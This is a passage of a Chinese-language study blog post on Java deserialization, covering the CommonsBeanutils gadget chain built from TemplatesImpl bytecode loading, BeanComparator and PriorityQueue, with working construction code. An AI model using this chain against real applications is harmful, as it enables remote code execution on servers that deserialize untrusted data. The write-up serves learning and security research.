+<span class="line"><span style="color: #ABB2BF">        </span><span style="color: #E5C07B">ObjectInputStream</span><span style="color: #ABB2BF"> </span><span style="color: #E06C75">ois</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">=</span><span style="color: #ABB2BF"> </span><span style="color: #C678DD">new</span><span style="color: #ABB2BF"> </span><span style="color: #61AFEF">ObjectInputStream</span><span style="color: #ABB2BF">(</span><span style="color: #C678DD">new</span><span style="color: #ABB2BF"> </span><span style="color: #61AFEF">FileInputStream</span><span style="color: #ABB2BF">(filename));</span></span>
+<span class="line"><span style="color: #ABB2BF">        </span><span style="color: #E5C07B">Object</span><span style="color: #ABB2BF"> </span><span style="color: #E06C75">obj</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">=</span><span style="color: #ABB2BF"> </span><span style="color: #E5C07B">ois</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">readObject</span><span style="color: #ABB2BF">();</span></span>
+<span class="line"><span style="color: #ABB2BF">        </span><span style="color: #C678DD">return</span><span style="color: #ABB2BF"> obj;</span></span>
+<span class="line"><span style="color: #ABB2BF">    }</span></span>
+<span class="line"></span>
+<span class="line"><span style="color: #ABB2BF">}</span></span></code></pre></div></div></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251210151727530.png" srcset="/img/loading.gif" lazyload alt="image-20251210151727418"></p>
+<p>测试没问题（大家复现的时候记得改自己的test.class地址）</p>
+</li>
+<li><p>接下来的流程就和上面的urldns一样了</p>
+<p><img src="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251210152336528.png" srcset="/img/loading.gif" lazyload alt="image-20251210152336424"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251210153902957.png" srcset="/img/loading.gif" lazyload alt="image-20251210153902841"></p>
+</li>
+</ul>
+<h2 id="CB"><a href="#CB" class="headerlink" title="CB"></a>CB</h2><blockquote>
+<p>CB主要是对javabean的增强</p>
+</blockquote>
+<h3 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h3><ul>
+<li><p>javabean算是一种类型，符合这种格式的就叫javabean</p>
+<figure class="shiki java"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #C678DD">public</span><span style="color: #E06C75"> </span><span style="color: #C678DD">class</span><span style="color: #E06C75"> </span><span style="color: #E5C07B">Person</span><span style="color: #E06C75"> </span><span style="color: #ABB2BF">{</span><span style="color: #7F848E; font-style: italic">//公有类</span></span>
+<span class="line"></span>
+<span class="line"><span style="color: #E06C75">    </span><span style="color: #C678DD">private</span><span style="color: #E06C75"> </span><span style="color: #E5C07B">String</span><span style="color: #E06C75"> name</span><span style="color: #ABB2BF">;</span></span>
+<span class="line"><span style="color: #E06C75">    </span><span style="color: #C678DD">private</span><span style="color: #E06C75"> </span><span style="color: #C678DD">int</span><span style="color: #E06C75"> age</span><span style="color: #ABB2BF">;</span></span>
+<span class="line"></span>
+<span class="line"><span style="color: #E06C75">    </span><span style="color: #7F848E; font-style: italic">// 无参构造</span></span>
+<span class="line"><span style="color: #E06C75">    </span><span style="color: #C678DD">public</span><span style="color: #61AFEF"> User</span><span style="color: #ABB2BF">()</span><span style="color: #61AFEF"> </span><span style="color: #ABB2BF">{}</span></span>
+<span class="line"></span>
+<span class="line"><span style="color: #E06C75">    </span><span style="color: #7F848E; font-style: italic">// 可选：有参构造</span></span>
+<span class="line"><span style="color: #E06C75">    </span><span style="color: #C678DD">public</span><span style="color: #61AFEF"> User</span><span style="color: #ABB2BF">(</span><span style="color: #E5C07B">String</span><span style="color: #ABB2BF"> </span><span style="color: #E06C75; font-style: italic">name</span><span style="color: #ABB2BF">, </span><span style="color: #C678DD">int</span><span style="color: #ABB2BF"> </span><span style="color: #E06C75; font-style: italic">age</span><span style="color: #ABB2BF">)</span><span style="color: #61AFEF"> </span><span style="color: #ABB2BF">{</span></span>
+<span class="line"><span style="color: #ABB2BF">        </span><span style="color: #E5C07B">this</span><span style="color: #ABB2BF">.</span><span style="color: #E5C07B">name</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">=</span><span style="color: #ABB2BF"> name;</span></span>
+<span class="line"><span style="color: #ABB2BF">        </span><span style="color: #E5C07B">this</span><span style="color: #ABB2BF">.</span><span style="color: #E5C07B">age</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">=</span><span style="color: #ABB2BF"> age;</span></span>
+<span class="line"><span style="color: #ABB2BF">    }</span></span>
+<span class="line"></span>
+<span class="line"><span style="color: #E06C75">    </span><span style="color: #7F848E; font-style: italic">// 可以Getter/Setter</span></span>
+<span class="line"><span style="color: #E06C75">    </span><span style="color: #C678DD">public</span><span style="color: #61AFEF"> </span><span style="color: #E5C07B">String</span><span style="color: #61AFEF"> getName</span><span style="color: #ABB2BF">()</span><span style="color: #61AFEF"> </span><span style="color: #ABB2BF">{</span></span>
+<span class="line"><span style="color: #ABB2BF">        </span><span style="color: #C678DD">return</span><span style="color: #ABB2BF"> name;</span></span>
+<span class="line"><span style="color: #ABB2BF">    }</span></span>
+<span class="line"></span>
+<span class="line"><span style="color: #E06C75">    </span><span style="color: #C678DD">public</span><span style="color: #61AFEF"> </span><span style="color: #C678DD">void</span><span style="color: #61AFEF"> setName</span><span style="color: #ABB2BF">(</span><span style="color: #E5C07B">String</span><span style="color: #ABB2BF"> </span><span style="color: #E06C75; font-style: italic">name</span><span style="color: #ABB2BF">)</span><span style="color: #61AFEF"> </span><span style="color: #ABB2BF">{</span></span>
+<span class="line"><span style="color: #ABB2BF">        </span><span style="color: #E5C07B">this</span><span style="color: #ABB2BF">.</span><span style="color: #E5C07B">name</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">=</span><span style="color: #ABB2BF"> name;</span></span>
+<span class="line"><span style="color: #ABB2BF">    }</span></span>
+<span class="line"></span>
+<span class="line"><span style="color: #E06C75">    </span><span style="color: #C678DD">public</span><span style="color: #61AFEF"> </span><span style="color: #C678DD">int</span><span style="color: #61AFEF"> getAge</span><span style="color: #ABB2BF">()</span><span style="color: #61AFEF"> </span><span style="color: #ABB2BF">{</span></span>
+<span class="line"><span style="color: #ABB2BF">        </span><span style="color: #C678DD">return</span><span style="color: #ABB2BF"> age;</span></span>
+<span class="line"><span style="color: #ABB2BF">    }</span></span>
+<span class="line"></span>
+<span class="line"><span style="color: #E06C75">    </span><span style="color: #C678DD">public</span><span style="color: #61AFEF"> </span><span style="color: #C678DD">void</span><span style="color: #61AFEF"> setAge</span><span style="color: #ABB2BF">(</span><span style="color: #C678DD">int</span><span style="color: #ABB2BF"> </span><span style="color: #E06C75; font-style: italic">age</span><span style="color: #ABB2BF">)</span><span style="color: #61AFEF"> </span><span style="color: #ABB2BF">{</span></span>
+<span class="line"><span style="color: #ABB2BF">        </span><span style="color: #E5C07B">this</span><span style="color: #ABB2BF">.</span><span style="color: #E5C07B">age</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">=</span><span style="color: #ABB2BF"> age;</span></span>
+<span class="line"><span style="color: #ABB2BF">    }</span></span>
+<span class="line"><span style="color: #ABB2BF">}</span></span></code></pre></div></div></figure>
+</li>
+<li><p>这样我们在每次调用的时候都得这么写：</p>
+<p><img src="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251210215858809.png" srcset="/img/loading.gif" lazyload alt="image-20251210215858751"></p>
+<p>相当于每次使用的时候都得这么写，比较麻烦</p>
+</li>
+<li><p>有没有可以动态调用的方法，使得代码更加简洁呢？？？</p>
+<p>于是就有了<code>CB</code></p>
+<p><img src="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251210220322441.png" srcset="/img/loading.gif" lazyload alt="image-20251210220322393"></p>
+<p>使用<code>PropertyUtils.getProperty</code>来获取类的属性值</p>
+</li>
+<li><p>那么这里动态获取属性，会不会也动态传入危险命令呢？？？</p>
+</li>
+</ul>
+<h3 id="分析-1"><a href="#分析-1" class="headerlink" title="分析"></a>分析</h3><ul>
+<li><p>一步步跟进</p>
+<p><img src="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251210223641183.png" srcset="/img/loading.gif" lazyload alt="img"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251210223650249.png" srcset="/img/loading.gif" lazyload alt="img"></p>
+</li>
+<li><p>调getSimpleProperty方法</p>
+<p><img src="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251210223705417.png" srcset="/img/loading.gif" lazyload alt="img"></p>
+</li>
+<li><p>获取到一个属性描述符descriptor</p>
+<p><img src="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251210223716153.png" srcset="/img/loading.gif" lazyload alt="img"></p>
+</li>
+<li><p>descriptor后，获得属性的名字(驼峰命名)，get，set方法</p>
+<p>首字母转化成大写<code>Age</code></p>
+<p><img src="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251210223752013.png" srcset="/img/loading.gif" lazyload alt="img"></p>
+</li>
+<li><p>获得方法后反射调用bean对象符合javaBean格式的方法</p>
+<p><img src="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251210223816499.png" srcset="/img/loading.gif" lazyload alt="img"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251210223820400.png" srcset="/img/loading.gif" lazyload alt="img"></p>
+</li>
+</ul>
+<blockquote>
+<p>在之前见过的TemplatesImpl中存在两处可利用点，可以作为切入点，将javaBean连接到利用链上</p>
+<p>TemplatesImpl调用getOutputProperties实现类的动态加载</p>
+</blockquote>
+<ul>
+<li><p><img src="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251210223920367.png" srcset="/img/loading.gif" lazyload alt="img"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251210223925918.png" srcset="/img/loading.gif" lazyload alt="img"></p>
+</li>
+</ul>
+<h3 id="构造过程"><a href="#构造过程" class="headerlink" title="构造过程"></a>构造过程</h3><ul>
+<li><p>PropertyUtils.getProperty调TemplatesImpl的私有属性outputProperties的话，就会动态调到TemplatesImpl的getOutputProperties方法，接着方法里面(CC3)还调了newTransformer加载类</p>
+<p>测试一下</p>
+<figure class="shiki java"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #C678DD">public</span><span style="color: #E06C75"> </span><span style="color: #C678DD">class</span><span style="color: #E06C75"> </span><span style="color: #E5C07B">BeanTest</span><span style="color: #ABB2BF">{</span></span>
+<span class="line"></span>
+<span class="line"><span style="color: #E06C75">        </span><span style="color: #C678DD">public</span><span style="color: #61AFEF"> </span><span style="color: #C678DD">static</span><span style="color: #61AFEF"> </span><span style="color: #C678DD">void</span><span style="color: #61AFEF"> main</span><span style="color: #ABB2BF">(</span><span style="color: #E5C07B">String</span><span style="color: #ABB2BF">[] </span><span style="color: #E06C75; font-style: italic">args</span><span style="color: #ABB2BF">)</span><span style="color: #61AFEF"> </span><span style="color: #C678DD">throws</span><span style="color: #61AFEF"> </span><span style="color: #E5C07B">Exception</span><span style="color: #61AFEF"> </span><span style="color: #ABB2BF">{</span></span>
+<span class="line"></span>
+<span class="line"><span style="color: #ABB2BF">            </span><span style="color: #E5C07B">TemplatesImpl</span><span style="color: #ABB2BF"> </span><span style="color: #E06C75">templates</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">=</span><span style="color: #ABB2BF"> </span><span style="color: #C678DD">new</span><span style="color: #ABB2BF"> </span><span style="color: #61AFEF">TemplatesImpl</span><span style="color: #ABB2BF">();</span></span>
+<span class="line"></span>
+<span class="line"><span style="color: #ABB2BF">            </span><span style="color: #E5C07B">Class</span><span style="color: #ABB2BF"> </span><span style="color: #E06C75">tl</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">=</span><span style="color: #ABB2BF"> </span><span style="color: #E5C07B">templates</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">getClass</span><span style="color: #ABB2BF">();</span></span>
+<span class="line"><span style="color: #ABB2BF">            </span><span style="color: #E5C07B">Field</span><span style="color: #ABB2BF"> </span><span style="color: #E06C75">name</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">=</span><span style="color: #ABB2BF"> </span><span style="color: #E5C07B">tl</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">getDeclaredField</span><span style="color: #ABB2BF">(</span><span style="color: #98C379">&quot;_name&quot;</span><span style="color: #ABB2BF">);</span></span>
+<span class="line"><span style="color: #ABB2BF">            </span><span style="color: #E5C07B">name</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">setAccessible</span><span style="color: #ABB2BF">(</span><span style="color: #D19A66">true</span><span style="color: #ABB2BF">);</span></span>
+<span class="line"><span style="color: #ABB2BF">            </span><span style="color: #E5C07B">name</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">set</span><span style="color: #ABB2BF">(templates, </span><span style="color: #98C379">&quot;CC3&quot;</span><span style="color: #ABB2BF">);</span></span>
+<span class="line"></span>
+<span class="line"><span style="color: #ABB2BF">            </span><span style="color: #C678DD">byte</span><span style="color: #ABB2BF">[] </span><span style="color: #E06C75">code</span><span style="color: #56B6C2">=</span><span style="color: #ABB2BF"> </span><span style="color: #E5C07B">Files</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">readAllBytes</span><span style="color: #ABB2BF">(</span><span style="color: #E5C07B">Paths</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">get</span><span style="color: #ABB2BF">(</span><span style="color: #98C379">&quot;C://Users//95227//Desktop//实验室//其他//序列化//class//Test.class&quot;</span><span style="color: #ABB2BF">));</span></span>
+<span class="line"><span style="color: #ABB2BF">            </span><span style="color: #C678DD">byte</span><span style="color: #ABB2BF">[][] </span><span style="color: #E06C75">codes</span><span style="color: #56B6C2">=</span><span style="color: #ABB2BF">{code};</span></span>
+<span class="line"><span style="color: #ABB2BF">            </span><span style="color: #E5C07B">Field</span><span style="color: #ABB2BF"> </span><span style="color: #E06C75">bytecodes</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">=</span><span style="color: #ABB2BF"> </span><span style="color: #E5C07B">tl</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">getDeclaredField</span><span style="color: #ABB2BF">(</span><span style="color: #98C379">&quot;_bytecodes&quot;</span><span style="color: #ABB2BF">);</span></span>
+<span class="line"><span style="color: #ABB2BF">            </span><span style="color: #E5C07B">bytecodes</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">setAccessible</span><span style="color: #ABB2BF">(</span><span style="color: #D19A66">true</span><span style="color: #ABB2BF">);</span></span>
+<span class="line"><span style="color: #ABB2BF">            </span><span style="color: #E5C07B">bytecodes</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">set</span><span style="color: #ABB2BF">(templates, codes);</span></span>
+<span class="line"></span>
+<span class="line"><span style="color: #ABB2BF">            </span><span style="color: #7F848E; font-style: italic">//先反射给_tfactory赋值（目前没有反序列化）</span></span>
+<span class="line"><span style="color: #ABB2BF">            </span><span style="color: #E5C07B">Field</span><span style="color: #ABB2BF"> </span><span style="color: #E06C75">tfactory</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">=</span><span style="color: #ABB2BF"> </span><span style="color: #E5C07B">tl</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">getDeclaredField</span><span style="color: #ABB2BF">(</span><span style="color: #98C379">&quot;_tfactory&quot;</span><span style="color: #ABB2BF">);</span></span>
+<span class="line"><span style="color: #ABB2BF">            </span><span style="color: #E5C07B">tfactory</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">setAccessible</span><span style="color: #ABB2BF">(</span><span style="color: #D19A66">true</span><span style="color: #ABB2BF">);</span></span>
+<span class="line"><span style="color: #ABB2BF">            </span><span style="color: #E5C07B">tfactory</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">set</span><span style="color: #ABB2BF">(templates, </span><span style="color: #C678DD">new</span><span style="color: #ABB2BF"> </span><span style="color: #61AFEF">TransformerFactoryImpl</span><span style="color: #ABB2BF">());</span></span>
+<span class="line"></span>
+<span class="line"><span style="color: #ABB2BF">            </span><span style="color: #E5C07B">PropertyUtils</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">getProperty</span><span style="color: #ABB2BF">(templates,</span><span style="color: #98C379">&quot;outputProperties&quot;</span><span style="color: #ABB2BF">);</span></span>
+<span class="line"><span style="color: #ABB2BF">        }</span></span>
+<span class="line"><span style="color: #E06C75">    </span><span style="color: #ABB2BF">}</span></span></code></pre></div></div></figure>
+
+<p>可行</p>
+<p>所以目前我们要做的就是：找<code>getProperty</code>的反序列化调用</p>
+</li>
+<li><p>查找用法<code>getProperty</code></p>
+<p>注意：在查找的选择上，可以刻意的先我们之前学的cc靠拢</p>
+<ul>
+<li><p>transform不行</p>
+<p>因为他的所在类没有继承序列化</p>
+<p><img src="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251211110851854.png" srcset="/img/loading.gif" lazyload alt="image-20251211110844757"></p>
+</li>
+<li><p>compare可行</p>
+<p><img src="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251211111139737.png" srcset="/img/loading.gif" lazyload alt="image-20251211111139692"></p>
+<p>而且属性可控</p>
+<p><img src="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251211111246057.png" srcset="/img/loading.gif" lazyload alt="image-20251211111246004"></p>
+</li>
+</ul>
+</li>
+<li><p><code>compare</code>可以和cc2的优先队列<code>PriorityQueue</code>类相结合</p>
+<p><img src="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251211112206569.png" srcset="/img/loading.gif" lazyload alt="image-20251211112206226"></p>
+</li>
+<li><p>除了cc3的加载类部分</p>
+<p>接下来</p>
+<p><code>new  BeanComparator</code></p>
+<p>查看其构造函数</p>
+<figure class="shiki java"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #C678DD">public</span><span style="color: #E06C75"> </span><span style="color: #61AFEF">BeanComparator</span><span style="color: #E06C75">( </span><span style="color: #E5C07B">String</span><span style="color: #E06C75"> property ) {</span></span>
+<span class="line"><span style="color: #E06C75">    </span><span style="color: #E5C07B">this</span><span style="color: #E06C75">( property</span><span style="color: #ABB2BF">,</span><span style="color: #E06C75"> </span><span style="color: #E5C07B">ComparableComparator</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">getInstance</span><span style="color: #ABB2BF">()</span><span style="color: #E06C75"> )</span><span style="color: #ABB2BF">;</span></span>
+<span class="line"><span style="color: #E06C75">}</span></span></code></pre></div></div></figure>
+
+<p><code>property</code>就是要触发的那个属性（<code>compare</code>方法里面的）</p>
+<p>这么写就好</p>
+<figure class="shiki java"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #E5C07B">BeanComparator</span><span style="color: #E06C75"> beanComparator </span><span style="color: #56B6C2">=</span><span style="color: #E06C75"> </span><span style="color: #C678DD">new</span><span style="color: #E06C75"> </span><span style="color: #61AFEF">BeanComparator</span><span style="color: #E06C75">(</span><span style="color: #98C379">&quot;outputProperties&quot;</span><span style="color: #E06C75">)</span><span style="color: #ABB2BF">;</span><span style="color: #7F848E; font-style: italic">//这是我们要触发的属性</span></span></code></pre></div></div></figure>
+</li>
+<li><p>后面就是cc2优先队列的事情了</p>
+<p>目前我们的代码</p>
+<figure class="shiki java"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #C678DD">public</span><span style="color: #E06C75"> </span><span style="color: #C678DD">class</span><span style="color: #E06C75"> </span><span style="color: #E5C07B">BeanTest</span><span style="color: #ABB2BF">{</span></span>
+<span class="line"></span>
+<span class="line"><span style="color: #E06C75">        </span><span style="color: #C678DD">public</span><span style="color: #61AFEF"> </span><span style="color: #C678DD">static</span><span style="color: #61AFEF"> </span><span style="color: #C678DD">void</span><span style="color: #61AFEF"> main</span><span style="color: #ABB2BF">(</span><span style="color: #E5C07B">String</span><span style="color: #ABB2BF">[] </span><span style="color: #E06C75; font-style: italic">args</span><span style="color: #ABB2BF">)</span><span style="color: #61AFEF"> </span><span style="color: #C678DD">throws</span><span style="color: #61AFEF"> </span><span style="color: #E5C07B">Exception</span><span style="color: #61AFEF"> </span><span style="color: #ABB2BF">{</span></span>
+<span class="line"><span style="color: #ABB2BF">            </span><span style="color: #7F848E; font-style: italic">//CC3</span></span>
+<span class="line"><span style="color: #ABB2BF">            </span><span style="color: #E5C07B">TemplatesImpl</span><span style="color: #ABB2BF"> </span><span style="color: #E06C75">templates</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">=</span><span style="color: #ABB2BF"> </span><span style="color: #C678DD">new</span><span style="color: #ABB2BF"> </span><span style="color: #61AFEF">TemplatesImpl</span><span style="color: #ABB2BF">();</span></span>
+<span class="line"><span style="color: #ABB2BF">            </span><span style="color: #E5C07B">Class</span><span style="color: #ABB2BF"> </span><span style="color: #E06C75">tl</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">=</span><span style="color: #ABB2BF"> </span><span style="color: #E5C07B">templates</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">getClass</span><span style="color: #ABB2BF">();</span></span>
+<span class="line"><span style="color: #ABB2BF">            </span><span style="color: #E5C07B">Field</span><span style="color: #ABB2BF"> </span><span style="color: #E06C75">name</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">=</span><span style="color: #ABB2BF"> </span><span style="color: #E5C07B">tl</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">getDeclaredField</span><span style="color: #ABB2BF">(</span><span style="color: #98C379">&quot;_name&quot;</span><span style="color: #ABB2BF">);</span></span>
+<span class="line"><span style="color: #ABB2BF">            </span><span style="color: #E5C07B">name</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">setAccessible</span><span style="color: #ABB2BF">(</span><span style="color: #D19A66">true</span><span style="color: #ABB2BF">);</span></span>
+<span class="line"><span style="color: #ABB2BF">            </span><span style="color: #E5C07B">name</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">set</span><span style="color: #ABB2BF">(templates, </span><span style="color: #98C379">&quot;CC3&quot;</span><span style="color: #ABB2BF">);</span></span>
+<span class="line"><span style="color: #ABB2BF">            </span><span style="color: #E5C07B">Field</span><span style="color: #ABB2BF"> </span><span style="color: #E06C75">bytecodes</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">=</span><span style="color: #ABB2BF"> </span><span style="color: #E5C07B">tl</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">getDeclaredField</span><span style="color: #ABB2BF">(</span><span style="color: #98C379">&quot;_bytecodes&quot;</span><span style="color: #ABB2BF">);</span></span>
+<span class="line"><span style="color: #ABB2BF">            </span><span style="color: #E5C07B">bytecodes</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">setAccessible</span><span style="color: #ABB2BF">(</span><span style="color: #D19A66">true</span><span style="color: #ABB2BF">);</span></span>
+<span class="line"></span>
+<span class="line"><span style="color: #ABB2BF">            </span><span style="color: #C678DD">byte</span><span style="color: #ABB2BF">[] </span><span style="color: #E06C75">code</span><span style="color: #56B6C2">=</span><span style="color: #ABB2BF"> </span><span style="color: #E5C07B">Files</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">readAllBytes</span><span style="color: #ABB2BF">(</span><span style="color: #E5C07B">Paths</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">get</span><span style="color: #ABB2BF">(</span><span style="color: #98C379">&quot;C://Users//95227//Desktop//实验室//其他//序列化//class//Test.class&quot;</span><span style="color: #ABB2BF">));</span></span>
+<span class="line"><span style="color: #ABB2BF">            </span><span style="color: #C678DD">byte</span><span style="color: #ABB2BF">[][] </span><span style="color: #E06C75">codes</span><span style="color: #56B6C2">=</span><span style="color: #ABB2BF">{code};</span></span>
+<span class="line"><span style="color: #ABB2BF">            </span><span style="color: #E5C07B">bytecodes</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">set</span><span style="color: #ABB2BF">(templates, codes);</span></span>
+<span class="line"><span style="color: #ABB2BF">            </span><span style="color: #7F848E; font-style: italic">//CB</span></span>
+<span class="line"><span style="color: #ABB2BF">            </span><span style="color: #E5C07B">BeanComparator</span><span style="color: #ABB2BF"> </span><span style="color: #E06C75">beanComparator</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">=</span><span style="color: #ABB2BF"> </span><span style="color: #C678DD">new</span><span style="color: #ABB2BF"> </span><span style="color: #61AFEF">BeanComparator</span><span style="color: #ABB2BF">(</span><span style="color: #98C379">&quot;outputProperties&quot;</span><span style="color: #ABB2BF">);</span></span>
+<span class="line"><span style="color: #ABB2BF">            </span><span style="color: #7F848E; font-style: italic">//CC2</span></span>
+<span class="line"><span style="color: #ABB2BF">            </span><span style="color: #E5C07B">PriorityQueue</span><span style="color: #ABB2BF"> </span><span style="color: #E06C75">priorityQueue</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">=</span><span style="color: #ABB2BF"> </span><span style="color: #C678DD">new</span><span style="color: #ABB2BF"> </span><span style="color: #E5C07B">PriorityQueue</span><span style="color: #ABB2BF">&lt;&gt;(beanComparator);</span></span>
+<span class="line"><span style="color: #ABB2BF">            </span><span style="color: #7F848E; font-style: italic">//PriorityQueue</span></span>
+<span class="line"></span>
+<span class="line"><span style="color: #ABB2BF">            </span><span style="color: #E5C07B">priorityQueue</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">add</span><span style="color: #ABB2BF">(templates);</span></span>
+<span class="line"><span style="color: #ABB2BF">            </span><span style="color: #E5C07B">priorityQueue</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">add</span><span style="color: #ABB2BF">(</span><span style="color: #D19A66">2</span><span style="color: #ABB2BF">);</span></span>
+<span class="line"></span>
+<span class="line"><span style="color: #ABB2BF">            </span><span style="color: #61AFEF">serialize</span><span style="color: #ABB2BF">(priorityQueue);</span></span>
+<span class="line"><span style="color: #ABB2BF">            </span><span style="color: #61AFEF">unserialize</span><span style="color: #ABB2BF">(</span><span style="color: #98C379">&quot;ser.bin&quot;</span><span style="color: #ABB2BF">);</span></span>
+<span class="line"></span>
+<span class="line"><span style="color: #ABB2BF">        }</span></span>
+<span class="line"><span style="color: #E06C75">    </span><span style="color: #C678DD">public</span><span style="color: #61AFEF"> </span><span style="color: #C678DD">static</span><span style="color: #61AFEF"> </span><span style="color: #C678DD">void</span><span style="color: #61AFEF"> serialize</span><span style="color: #ABB2BF">(</span><span style="color: #E5C07B">Object</span><span style="color: #ABB2BF"> </span><span style="color: #E06C75; font-style: italic">obj</span><span style="color: #ABB2BF">)</span><span style="color: #61AFEF"> </span><span style="color: #C678DD">throws</span><span style="color: #61AFEF"> </span><span style="color: #E5C07B">IOException</span><span style="color: #61AFEF"> </span><span style="color: #ABB2BF">{</span></span>
